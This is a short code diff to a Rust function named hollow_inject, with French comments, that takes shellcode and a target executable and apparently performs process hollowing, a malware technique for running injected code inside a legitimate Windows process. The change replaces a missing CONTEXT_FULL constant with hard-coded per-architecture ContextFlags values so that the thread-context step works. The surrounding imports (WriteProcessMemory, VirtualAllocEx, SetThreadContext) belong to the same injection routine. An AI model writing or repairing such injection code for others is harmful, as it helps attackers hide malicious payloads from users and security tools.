@@ -30,7 +30,7 @@ pub fn hollow_inject(shellcode: &[u8], target_exe: &str) -> Result<u32, String> 
             Diagnostics::Debug::{
                 GetThreadContext, SetThreadContext,
                 ReadProcessMemory, WriteProcessMemory,
-                CONTEXT, CONTEXT_FULL,
+                CONTEXT,
             },
             Memory::{
                 VirtualAllocEx, VirtualProtectEx,
@@ -83,7 +83,10 @@ pub fn hollow_inject(shellcode: &[u8], target_exe: &str) -> Result<u32, String> 
 
         // 2. Récupérer le contexte du thread principal (pour trouver le PEB)
         let mut ctx: CONTEXT = std::mem::zeroed();
-        ctx.ContextFlags = CONTEXT_FULL;
+        #[cfg(target_arch = "x86_64")]
+        { ctx.ContextFlags = 0x10000B; }
+        #[cfg(target_arch = "x86")]
+        { ctx.ContextFlags = 0x10007; }
 
         if GetThreadContext(thread_handle, &mut ctx) == 0 {
             CloseHandle(proc_handle);
